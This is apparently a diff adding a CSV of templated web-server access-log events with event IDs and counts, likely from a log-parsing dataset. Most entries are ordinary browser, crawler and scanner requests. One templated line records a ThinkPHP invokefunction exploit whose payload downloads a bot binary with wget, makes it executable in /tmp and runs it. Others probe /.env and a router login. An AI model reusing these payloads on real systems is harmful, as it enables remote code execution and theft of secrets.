@@ -1,0 +1,27 @@
+EventTemplate,EventId,Occurrences
+"""POST /boaform/admin/formLogin HTTP/<*>.<*>"" <*> <*> ""http:/<*>/admin/login.asp"" ""Mozilla/<*>.<*> (X11; Ubuntu; Linux x86_<*>; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>"" ""-""",55f54f0c,3
+""""" <*> <*> ""-"" ""-"" ""-""",fec19c0b,3
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Linux; U; Android <*>.<*>.<*>; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> UCBrowser<*> Mobile Safari/<*>.<*>"" ""-""",57091849,1
+"""GET <*> HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (X11; Ubuntu; Linux x86_<*>; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>"" ""-""",8b23d509,3
+"""GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[<*>]=shell_exec&vars[<*>][]= 'wget http:/<*>/YourName/BinName.x86 -O /tmp/.Fdp; chmod <*> /tmp/.Fdp; /tmp/.Fdp ThinkPHP.x86.Selfrep' HTTP/<*>.<*>"" <*> <*> ""-"" ""Tsunami/<*>.<*>"" ""-""",8861b146,2
+"""HEAD / HTTP/<*>.<*>"" <*> <*> ""-"" ""Microsoft Office Excel <*>"" ""-""",9f113bd3,2
+"""GET <*> HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; .NET CLR <*>.<*>.<*>)"" ""-""",7055538c,2
+"""\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEAo\x0E\xC4-TT.D\x8A\x8B\x84\x0E\x1Cb2\xB0\xBE\x8D3\x8E&\x97n\x88\xA8\xE1\x81L\xE5\xDC\xDC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0"" <*> <*> ""-"" ""-"" ""-""",f907ae25,1
+"""GET /.env HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>"" ""-""",59b09335,2
+"""POST / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*>"" ""-""",52995d7c,2
+"""GET /Public/kindeditor/kindeditor.js HTTP/<*>.<*>"" <*> <*> ""-"" ""python-requests/<*>.<*>.<*>"" ""-""",546d0480,1
+"""GET / HTTP/<*>.<*>"" <*> <*> ""https://www.google.com/"" ""Mozilla/<*>.<*> (X11; Linux i586; rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>"" ""<*>""",ad90aa53,1
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Macintosh; U; PPC Mac OS X <*>_<*>_<*>; fr) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Safari/<*>.<*>"" ""-""",a4ef70c9,1
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""masscan/<*>.<*> (https://github.com/robertdavidgraham/masscan)"" ""-""",2ffa441d,3
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Windows NT <*>.<*>;en-US) AppleWebKit/<*>.<*>.<*> (KHTML, live Gecko) Chrome<*> Safari/<*>.<*>"" ""-""",858a6302,1
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""'Cloud mapping experiment. Contact research@pdrlabs.net'"" ""-""",ab8cf675,1
+"""OPTIONS <*> HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; .NET4.0C; .NET4.0E; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; LCTE)"" ""-""",d19bbd7a,2
+"""GET <*> HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (compatible; Baiduspider/<*>.<*>; +http://www.baidu.com/search/spider.html)"" ""-""",59133465,3
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Dalvik/<*>.<*>.<*> (Linux; U; Android <*>.<*>; ZTE BA520 Build/MRA58K)"" ""-""",67a9f856,2
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Linux Gnu (cow)"" ""-""",9fb22216,1
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> <*> rv:<*>.<*>) <*> <*> ""-""",4ae67ee4,2
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; Coolpad Y82-<*> Build/KTU84P) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Mobile Safari/<*>.<*> MicroMessenger<*> NetType/4G Language/zh_CN"" ""-""",c16d398e,1
+"""OPTIONS / HTTP/<*>.<*>"" <*> <*> ""-"" ""Microsoft Office Protocol Discovery"" ""-""",e504bd2c,1
+"""GET <*> HTTP/<*>.<*>"" <*> <*> <*> ""Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; HUAWEI ALE-CL00 Build/HuaweiALE-CL00; wv) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Mobile MQQBrowser/<*>.<*> TBS/<*> Safari/<*>.<*> MicroMessenger<*> NetType/4G Language/zh_CN"" ""-""",b4af4b78,2
+"""GET / HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> zgrab/<*>.x"" ""-""",baa54154,1
+"""GET /bag2 HTTP/<*>.<*>"" <*> <*> ""-"" ""Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>)"" ""-""",5cf96ee9,1
